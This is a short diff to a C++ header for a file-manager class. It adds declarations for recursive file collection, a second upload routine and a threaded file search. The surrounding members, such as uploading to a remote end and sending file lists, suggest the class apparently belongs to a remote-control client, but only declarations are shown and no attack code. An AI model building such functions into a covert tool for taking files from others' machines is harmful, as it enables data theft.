@@ -37,6 +37,8 @@ private:
     __int64 m_nCurrentProcessFileLength; // 当前正在处理的文件的长度
     bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
     bool UploadToRemote(LPBYTE lpBuffer);
+    void UploadToRemoteV2(LPBYTE lpBuffer, UINT nSize);
+    void CollectFilesRecursiveV2(const std::string& dirPath, const std::string& basePath, std::vector<std::string>& files);
     bool FixedUploadList(LPCTSTR lpszDirectory);
     void StopTransfer();
     UINT SendFilesList(LPCTSTR lpszDirectory);
@@ -53,6 +55,11 @@ private:
     void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
     void UploadNext();
     bool OpenFile(LPCTSTR lpFile, INT nShowCmd);
+    void SearchFiles(LPCTSTR lpszSearchPath, LPCTSTR lpszSearchName);
+    void SearchFilesRecursive(LPCTSTR lpszDirectory, LPCTSTR lpszPattern, LPBYTE &lpList, DWORD &dwOffset, DWORD &nBufferSize, int nDepth, DWORD &nResultCount, DWORD &dwLastSendTime);
+    static DWORD WINAPI SearchThreadProc(LPVOID lpParam);
+    HANDLE m_hSearchThread;
+    volatile bool m_bSearching;
 };
 
 #endif // !defined(AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
